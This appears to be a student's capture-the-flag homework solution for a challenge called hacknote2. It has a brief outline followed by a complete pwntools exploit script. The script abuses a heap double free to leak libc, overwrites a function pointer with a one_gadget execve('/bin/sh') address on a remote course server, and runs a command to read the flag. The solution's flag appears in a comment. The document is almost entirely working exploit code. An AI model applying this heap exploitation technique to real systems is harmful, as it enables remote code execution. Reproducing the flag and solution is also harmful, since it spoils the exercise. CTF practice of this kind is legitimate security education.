# HW4
## hacknote2 150
* `Double free` vulnerability.
* Fake data pointer -> leak libc.
* Fake function pointer -> one
* Trigger calling function pointer -> one

```python
#!/usr/bin/env python2
# -*- coding: ascii -*-
from pwn import *

# FLAG{DEATHNOTE!!!!}

context.arch = 'amd64'

e , l = ELF('./hacknote2-be8ec2d99971e21f21570810b554c787e3969623') , ELF('./libc.so.6-14c22be9aa11316f89909e4237314e009da38883')

host , port = 'csie.ctf.tw' , 10139

y = remote(host,port)


def add( size , data ):
    y.sendafter( 'ice :' , '1' )
    y.sendafter( 'e :' , str( size ) )
    y.sendafter( 't :' , data )

def sho( idx ):
    y.sendafter( 'ice :' , '3' )
    y.sendlineafter( 'x :' , str( idx ) )

def dle( idx ):
    y.sendafter( 'ice :' , '2' )
    y.sendafter( 'x :' , str( idx ) )


print_note_content = 0x400886

add( 0x10 , 'A' * 0x10 )

dle( 0 ) # double free
dle( 0 )

add( 0x70 , 'B' * 0x70 ) # get first chunk
add( 0x10 , p64( print_note_content ) + p64( e.got['__libc_start_main'] ) ) # get second and third chunk , the third chunk is overlap with the first ( the same ).
                                                                            # So it could let us modify the function pointer and data pointer

sho( 1 ) # leak libc

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success( 'libc -> %s' % hex( l.address ) )

dle( 2 ) # double free again
dle( 2 )

# https://github.com/david942j/one_gadget
'''
0xf0274 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
'''

one = 0xf0274

add( 0x70 , 'C' * 0x70 )
add( 0x10 , p64( l.address + one ) ) # fake print function pointer -> one

sho( 3 ) # trigger print function -> one

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()
```